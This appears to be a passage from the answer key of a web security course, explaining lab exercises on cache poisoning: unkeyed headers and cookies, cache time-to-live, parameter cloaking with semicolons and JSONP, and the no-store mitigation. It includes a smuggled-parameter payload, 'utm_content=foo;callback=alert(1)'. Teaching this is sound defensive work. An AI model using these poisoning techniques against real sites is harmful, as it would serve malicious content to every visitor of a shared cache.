2. **In Lab 1, why does adding `X-Forwarded-Host` with a payload affect every future visitor but only for a limited time?**
   The poisoned response gets stored in the cache under the key for `/` (without `X-Forwarded-Host` in the key). Every future request for `/` receives this cached response — including visitors who never sent `X-Forwarded-Host` at all. The "limited time" is the `Cache-Control: max-age=30` TTL — after 30 seconds the cache entry expires and the origin must serve a fresh (clean) response. The attacker can maintain the attack by re-sending the poisoning request every 25 seconds.

3. **In Lab 2, why is it surprising that a cookie can poison a shared cache?**
   Cookies are normally considered session-specific — each user has their own cookies and receives personalised responses based on them. The surprise is that the `fehost` cookie affects the response content but is not in the cache key — meaning the cache treats the response as public/shared. One attacker's malicious cookie value gets baked into a response that the cache then serves to all users — including those with no cookies at all. The cache has no concept of "this response came from a request with a specific cookie that changed the content."

4. **Explain parameter cloaking in your own words — what do the cache and origin disagree about, and why does that disagreement create a security issue?**
   The cache and origin disagree about what character separates URL parameters. The cache splits only on `&` — the standard. The origin also splits on `;` — a legacy convention. When the cache sees `utm_content=foo;callback=alert(1)`, it treats this as one parameter (`utm_content`) and strips it entirely (it's on the exclude list). When the origin sees the same string, it extracts two parameters — `utm_content=foo` AND `callback=alert(1)`. The `callback` parameter drives the JSONP response content — but from the cache's perspective it doesn't exist. The cache stores the poisoned response as if no special parameters were present — under the same key as a completely clean request.

5. **Why does excluding `utm_*` parameters from the cache key (a sensible performance optimisation) become a security risk in Lab 3?**
   Marketing teams append UTM parameters to every link — if UTM params were in the cache key, each unique shared URL would be a separate cache entry, destroying the cache hit rate. Excluding them is a legitimate performance choice. The security risk emerges when the origin server also supports `;` as a parameter separator — because an attacker can cloak any parameter inside the excluded `utm_content` value using `;`. The cache strips the entire cloaked payload along with `utm_content`, but the origin extracts and processes the hidden parameter. The performance optimisation inadvertently created an unkeyed input that cannot be seen in the cache key.

6. **You find an unkeyed input reflected in the response but the response has `Cache-Control: no-store`. Is this exploitable for cache poisoning?**
   No. `Cache-Control: no-store` instructs the cache to never store this response — the cache discards it immediately after serving it. Without a stored entry, no future user can receive the poisoned response. The unkeyed input reflection still exists and might be exploitable in other ways (reflected XSS if the reflection is in the right context, or used to influence the user's own response) — but cache poisoning specifically requires the response to be cached. `no-store` is an effective mitigation for cache poisoning on that specific endpoint.

---